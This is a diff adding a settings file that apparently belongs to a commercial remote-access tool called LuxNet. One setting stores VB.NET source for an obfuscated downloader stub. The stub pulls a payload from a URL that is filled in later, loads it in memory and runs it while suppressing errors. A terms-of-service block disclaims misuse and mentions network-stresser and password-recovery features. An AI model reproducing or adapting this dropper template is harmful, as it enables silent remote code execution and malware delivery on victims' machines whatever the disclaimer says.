@@ -1,0 +1,69 @@
+﻿<?xml version='1.0' encoding='utf-8'?>
+<SettingsFile xmlns="http://schemas.microsoft.com/VisualStudio/2004/01/settings" CurrentProfile="(Default)" GeneratedClassNamespace="My" GeneratedClassName="MySettings" UseMySettingsClassName="true">
+  <Profiles />
+  <Settings>
+    <Setting Name="downloader" Type="System.String" Scope="User">
+      <Value Profile="(Default)">Imports System
+Imports System.Windows.Forms
+Imports System.Net
+Imports System.Reflection
+
+&lt;Assembly: AssemblyTitle("")&gt; 
+&lt;Assembly: AssemblyDescription("")&gt; 
+&lt;Assembly: AssemblyCompany("")&gt; 
+&lt;Assembly: AssemblyProduct("")&gt; 
+&lt;Assembly: AssemblyCopyright("")&gt; 
+&lt;Assembly: AssemblyTrademark("")&gt; 
+&lt;Assembly: AssemblyVersion("3.5.2.4")&gt; 
+&lt;Assembly: AssemblyFileVersion("0.0.0.0")&gt;
+
+Module guExGIDYPlNZLifahIt8et9o2YAy1NXK
+    Dim vtmSvFbdBPMHVZgnF0fFEGDFYcaqXC2j As String = "REPLACEURLHERE"
+    Dim WithEvents kSQPeZNO4sUCGqpiERKHX4WYZd9NpCLI As New WebClient
+    Sub Main()
+        Try
+            kSQPeZNO4sUCGqpiERKHX4WYZd9NpCLI.DownloadDataAsync(New Uri(vtmSvFbdBPMHVZgnF0fFEGDFYcaqXC2j))
+            Application.Run()
+        Catch
+        End Try
+    End Sub
+    Private Sub sNuVTLJ9ohdKEdw5pwbfRwlbd9GbsvhL(iBJAakFh6LJksVLtwVcKfDI7s6kOCimA As Object, lzDiaDjaIpdWCcymCOpVdcNxSnRrgnsm As DownloadDataCompletedEventArgs) Handles kSQPeZNO4sUCGqpiERKHX4WYZd9NpCLI.DownloadDataCompleted
+        Try
+            Assembly.Load(lzDiaDjaIpdWCcymCOpVdcNxSnRrgnsm.Result).EntryPoint.Invoke(Nothing, Nothing)
+        Catch
+        End Try
+    End Sub
+End Module</Value>
+    </Setting>
+    <Setting Name="Label_TOS" Type="System.String" Scope="User">
+      <Value Profile="(Default)">LuxNet Terms of Service
+
+In order to use LuxNet all users have to agree to the following:
+
+1. LuxNet, its Owner &amp; Coder (XilluX) is not responsible for the way you use my product. LuxNet is
+    for personal use only, and it must only be used on machines that you own or have permission for.
+2. LuxNet was only designed for educational purpose and its misuse can be very illegal towards the law.
+    Any connection done by a foreign machine, needs to be removed correctly.
+3. By purchasing LuxNet, you agree not to charge back unauthorized, if you have issues with the software and
+    want a refund you have to contact me (XilluX) first. Refunds will only be given if there is a appropriate reason.
+4. Distribution of my client / server files is not allowed in any way. Scanning it anywhere else than the inbuilt scanner
+    is not allowed.
+5. You may only use the Network Stresser, Password Recovery and any other feature only with explicit permission.
+6. I have the rights to modify the T.O.S at any time.
+
+Short: You are not allowed to use LuxNet for malicious purposes, it was only created for legitimate usage.</Value>
+    </Setting>
+    <Setting Name="sounds" Type="System.Boolean" Scope="User">
+      <Value Profile="(Default)">False</Value>
+    </Setting>
+    <Setting Name="autolistening" Type="System.Boolean" Scope="User">
+      <Value Profile="(Default)">False</Value>
+    </Setting>
+    <Setting Name="notify" Type="System.Boolean" Scope="User">
+      <Value Profile="(Default)">False</Value>
+    </Setting>
+    <Setting Name="port" Type="System.Int32" Scope="User">
+      <Value Profile="(Default)">4431</Value>
+    </Setting>
+  </Settings>
+</SettingsFile>
